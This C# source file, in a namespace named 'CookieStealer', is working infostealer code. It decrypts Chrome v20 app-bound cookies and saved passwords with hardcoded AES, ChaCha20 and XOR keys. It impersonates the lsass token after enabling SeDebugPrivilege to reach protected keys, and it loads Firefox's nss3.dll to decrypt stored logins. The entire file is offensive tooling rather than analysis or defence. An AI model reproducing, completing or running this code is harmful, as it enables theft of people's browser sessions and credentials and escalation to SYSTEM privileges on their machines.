using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;

namespace CookieStealer;

public static class CryptoHelper
{
    public static byte[] DpapiUnprotect(byte[] encryptedData)
    {
        var dataIn = new DATA_BLOB();
        var dataOut = new DATA_BLOB();
        try
        {
            dataIn.cbData = encryptedData.Length;
            dataIn.pbData = Marshal.AllocHGlobal(encryptedData.Length);
            Marshal.Copy(encryptedData, 0, dataIn.pbData, encryptedData.Length);

            if (NativeMethods.CryptUnprotectData(ref dataIn, IntPtr.Zero, IntPtr.Zero,
                IntPtr.Zero, IntPtr.Zero, 0, ref dataOut))
            {
                var result = new byte[dataOut.cbData];
                Marshal.Copy(dataOut.pbData, result, 0, dataOut.cbData);
                return result;
            }
            return Array.Empty<byte>();
        }
        finally
        {
            if (dataIn.pbData != IntPtr.Zero) Marshal.FreeHGlobal(dataIn.pbData);
            if (dataOut.pbData != IntPtr.Zero) NativeMethods.LocalFree(dataOut.pbData);
        }
    }

    public static byte[] DecryptAesGcm(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
    {
        var cipher = new Org.BouncyCastle.Crypto.Engines.AesEngine();
        var gcm = new Org.BouncyCastle.Crypto.Modes.GcmBlockCipher(cipher);
        var parameters = new Org.BouncyCastle.Crypto.Parameters.AeadParameters(
            new Org.BouncyCastle.Crypto.Parameters.KeyParameter(key), 128, nonce);
        gcm.Init(false, parameters);

        var input = new byte[ciphertext.Length + tag.Length];
        Buffer.BlockCopy(ciphertext, 0, input, 0, ciphertext.Length);
        Buffer.BlockCopy(tag, 0, input, ciphertext.Length, tag.Length);

        var output = new byte[gcm.GetOutputSize(input.Length)];
        int len = gcm.ProcessBytes(input, 0, input.Length, output, 0);
        gcm.DoFinal(output, len);
        return output;
    }

    public static byte[] DecryptChaCha20Poly1305(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
    {
        var poly = new Org.BouncyCastle.Crypto.Modes.ChaCha20Poly1305();
        var parameters = new Org.BouncyCastle.Crypto.Parameters.AeadParameters(
            new Org.BouncyCastle.Crypto.Parameters.KeyParameter(key), 128, nonce);
        poly.Init(false, parameters);

        var input = new byte[ciphertext.Length + tag.Length];
        Buffer.BlockCopy(ciphertext, 0, input, 0, ciphertext.Length);
        Buffer.BlockCopy(tag, 0, input, ciphertext.Length, tag.Length);

        var output = new byte[poly.GetOutputSize(input.Length)];
        int len = poly.ProcessBytes(input, 0, input.Length, output, 0);
        poly.DoFinal(output, len);
        return output;
    }

    public static byte[] DecryptWithCng(byte[] inputData, string keyName)
    {
        int status = NativeMethods.NCryptOpenStorageProvider(out IntPtr hProvider,
            "Microsoft Software Key Storage Provider", 0);
        if (status != 0) return Array.Empty<byte>();

        try
        {
            status = NativeMethods.NCryptOpenKey(hProvider, out IntPtr hKey, keyName, 0, 0);
            if (status != 0) return Array.Empty<byte>();

            try
            {
                status = NativeMethods.NCryptDecrypt(hKey, inputData, inputData.Length,
                    IntPtr.Zero, null, 0, out int pcbResult, 0x40);
                if (status != 0) return Array.Empty<byte>();

                var output = new byte[pcbResult];
                status = NativeMethods.NCryptDecrypt(hKey, inputData, inputData.Length,
                    IntPtr.Zero, output, pcbResult, out pcbResult, 0x40);
                if (status != 0) return Array.Empty<byte>();

                return output[..pcbResult];
            }
            finally { NativeMethods.NCryptFreeObject(hKey); }
        }
        finally { NativeMethods.NCryptFreeObject(hProvider); }
    }

    public static byte[] ByteXor(byte[] ba1, byte[] ba2)
    {
        var result = new byte[Math.Min(ba1.Length, ba2.Length)];
        for (int i = 0; i < result.Length; i++)
            result[i] = (byte)(ba1[i] ^ ba2[i]);
        return result;
    }

    public static (Dictionary<string, object>? parsed, byte flag) ParseKeyBlob(byte[] blobData)
    {
        using var ms = new MemoryStream(blobData);
        using var reader = new BinaryReader(ms);

        int headerLen = reader.ReadInt32();
        byte[] header = reader.ReadBytes(headerLen);
        int contentLen = reader.ReadInt32();
        byte flag = reader.ReadByte();

        var parsed = new Dictionary<string, object>
        {
            ["header"] = header,
            ["flag"] = flag
        };

        if (flag == 1 || flag == 2)
        {
            parsed["iv"] = reader.ReadBytes(12);
            parsed["ciphertext"] = reader.ReadBytes(32);
            parsed["tag"] = reader.ReadBytes(16);
        }
        else if (flag == 3)
        {
            parsed["encrypted_aes_key"] = reader.ReadBytes(32);
            parsed["iv"] = reader.ReadBytes(12);
            parsed["ciphertext"] = reader.ReadBytes(32);
            parsed["tag"] = reader.ReadBytes(16);
        }
        else
        {
            parsed["raw_data"] = reader.ReadBytes((int)(ms.Length - ms.Position));
        }

        return (parsed, flag);
    }

    public static byte[] DeriveV20MasterKey(Dictionary<string, object> parsed, string keyName)
    {
        byte flag = (byte)parsed["flag"];
        byte[] iv = (byte[])parsed["iv"];
        byte[] ciphertext = (byte[])parsed["ciphertext"];
        byte[] tag = (byte[])parsed["tag"];

        if (flag == 1)
        {
            byte[] aesKey = Convert.FromHexString("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787");
            return DecryptAesGcm(aesKey, iv, ciphertext, tag);
        }
        else if (flag == 2)
        {
            byte[] chaKey = Convert.FromHexString("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660");
            return DecryptChaCha20Poly1305(chaKey, iv, ciphertext, tag);
        }
        else if (flag == 3)
        {
            byte[] xorKey = Convert.FromHexString("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390");
            byte[] encAesKey = (byte[])parsed["encrypted_aes_key"];

            byte[] decAesKey;
            using (var ctx = new SystemContext())
            {
                ctx.Impersonate();
                decAesKey = DecryptWithCng(encAesKey, keyName);
            }
            if (decAesKey.Length == 0) return Array.Empty<byte>();

            byte[] xoredKey = ByteXor(decAesKey, xorKey);
            return DecryptAesGcm(xoredKey, iv, ciphertext, tag);
        }

        return parsed.ContainsKey("raw_data") ? (byte[])parsed["raw_data"] : Array.Empty<byte>();
    }

    public static string? DecryptV20Value(byte[] encryptedValue, byte[] masterKey)
    {
        try
        {
            byte[] iv = encryptedValue[3..15];
            byte[] ciphertext = encryptedValue[15..^16];
            byte[] tag = encryptedValue[^16..];
            byte[] decrypted = DecryptAesGcm(masterKey, iv, ciphertext, tag);
            return Encoding.UTF8.GetString(decrypted, 32, decrypted.Length - 32);
        }
        catch { return null; }
    }

    public static string DecryptV20Password(byte[] encryptedPassword, byte[] masterKey)
    {
        try
        {
            if (encryptedPassword == null || encryptedPassword.Length == 0) return "";
            byte[] iv = encryptedPassword[3..15];
            byte[] payload = encryptedPassword[15..];
            byte[] ciphertext = payload[..^16];
            byte[] tag = payload[^16..];
            byte[] decrypted = DecryptAesGcm(masterKey, iv, ciphertext, tag);
            try { return Encoding.UTF8.GetString(decrypted); }
            catch { return Encoding.GetEncoding(1252).GetString(decrypted); }
        }
        catch (Exception e) { return $"<decryption_failed: {e.Message}>"; }
    }
}

public class SystemContext : IDisposable
{
    private bool _impersonated = false;

    public void Impersonate()
    {
        // Enable SeDebugPrivilege
        NativeMethods.OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle,
            0x0020 | 0x0008, out IntPtr tokenHandle);

        var tp = new TOKEN_PRIVILEGES
        {
            PrivilegeCount = 1,
            Attributes = NativeMethods.SE_PRIVILEGE_ENABLED
        };
        NativeMethods.LookupPrivilegeValue(null, NativeMethods.SE_DEBUG_NAME, out tp.Luid);
        NativeMethods.AdjustTokenPrivileges(tokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        NativeMethods.CloseHandle(tokenHandle);

        // Find lsass
        var lsass = System.Diagnostics.Process.GetProcessesByName("lsass").FirstOrDefault();
        if (lsass == null) throw new Exception("lsass not found");

        IntPtr hProcess = NativeMethods.OpenProcess(NativeMethods.PROCESS_QUERY_INFORMATION, false, lsass.Id);
        if (hProcess == IntPtr.Zero) throw new Exception("OpenProcess failed");

        NativeMethods.OpenProcessToken(hProcess, NativeMethods.TOKEN_DUPLICATE | NativeMethods.TOKEN_QUERY,
            out IntPtr lsassToken);
        NativeMethods.CloseHandle(hProcess);

        NativeMethods.DuplicateTokenEx(lsassToken, NativeMethods.TOKEN_ALL_ACCESS, IntPtr.Zero,
            NativeMethods.SecurityImpersonation, NativeMethods.TokenImpersonation, out IntPtr impToken);
        NativeMethods.CloseHandle(lsassToken);

        NativeMethods.SetThreadToken(IntPtr.Zero, impToken);
        NativeMethods.CloseHandle(impToken);
        _impersonated = true;
    }

    public void Dispose()
    {
        if (_impersonated) NativeMethods.RevertToSelf();
    }
}

public class NssHandler
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool AddDllDirectory(string lpPathName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr LoadLibraryEx(string lpLibFileName, IntPtr hFile, uint dwFlags);

    private IntPtr _nssLib = IntPtr.Zero;
    public bool Loaded => _nssLib != IntPtr.Zero;

    // NSS function delegates
    private delegate int NSS_InitDelegate(byte[] configdir);
    private delegate int NSS_ShutdownDelegate();
    private delegate int PK11SDR_DecryptDelegate(ref SECItem data, ref SECItem result, IntPtr cx);

    private NSS_InitDelegate? _nssInit;
    private NSS_ShutdownDelegate? _nssShutdown;
    private PK11SDR_DecryptDelegate? _pk11Decrypt;

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    public NssHandler()
    {
        string[] paths = {
            @"C:\Program Files\Mozilla Firefox\nss3.dll",
            @"C:\Program Files (x86)\Mozilla Firefox\nss3.dll"
        };

        foreach (var path in paths)
        {
            if (!File.Exists(path)) continue;
            try
            {
                string? dir = Path.GetDirectoryName(path);
                if (dir != null)
                {
                    AddDllDirectory(dir);
                    Environment.SetEnvironmentVariable("PATH",
                        dir + ";" + Environment.GetEnvironmentVariable("PATH"));
                }

                _nssLib = LoadLibraryEx(path, IntPtr.Zero, 0x00001100); // LOAD_LIBRARY_SEARCH_DLL_LOAD_DIR | LOAD_LIBRARY_SEARCH_DEFAULT_DIRS
                if (_nssLib == IntPtr.Zero) continue;

                var initPtr = GetProcAddress(_nssLib, "NSS_Init");
                var shutPtr = GetProcAddress(_nssLib, "NSS_Shutdown");
                var decPtr = GetProcAddress(_nssLib, "PK11SDR_Decrypt");

                if (initPtr != IntPtr.Zero)
                    _nssInit = Marshal.GetDelegateForFunctionPointer<NSS_InitDelegate>(initPtr);
                if (shutPtr != IntPtr.Zero)
                    _nssShutdown = Marshal.GetDelegateForFunctionPointer<NSS_ShutdownDelegate>(shutPtr);
                if (decPtr != IntPtr.Zero)
                    _pk11Decrypt = Marshal.GetDelegateForFunctionPointer<PK11SDR_DecryptDelegate>(decPtr);

                if (_nssInit != null && _pk11Decrypt != null) return;
            }
            catch { }
        }
    }

    public bool InitProfile(string profilePath)
    {
        if (!Loaded || _nssInit == null) return false;
        if (!File.Exists(Path.Combine(profilePath, "cert9.db")) &&
            !File.Exists(Path.Combine(profilePath, "cert8.db")))
            return false;

        int ret = _nssInit(Encoding.UTF8.GetBytes(profilePath + "\0"));
        return ret == 0;
    }

    public void Shutdown()
    {
        _nssShutdown?.Invoke();
    }

    public string? Decrypt(string encryptedB64)
    {
        if (!Loaded || _pk11Decrypt == null) return null;
        try
        {
            byte[] encrypted = Convert.FromBase64String(encryptedB64);
            IntPtr encPtr = Marshal.AllocHGlobal(encrypted.Length);
            Marshal.Copy(encrypted, 0, encPtr, encrypted.Length);

            var input = new SECItem { type = 0, data = encPtr, len = (uint)encrypted.Length };
            var output = new SECItem { type = 0, data = IntPtr.Zero, len = 0 };

            int ret = _pk11Decrypt(ref input, ref output, IntPtr.Zero);
            Marshal.FreeHGlobal(encPtr);

            if (ret == 0 && output.data != IntPtr.Zero)
            {
                byte[] decrypted = new byte[output.len];
                Marshal.Copy(output.data, decrypted, 0, (int)output.len);
                return Encoding.UTF8.GetString(decrypted);
            }
            return null;
        }
        catch { return null; }
    }
}
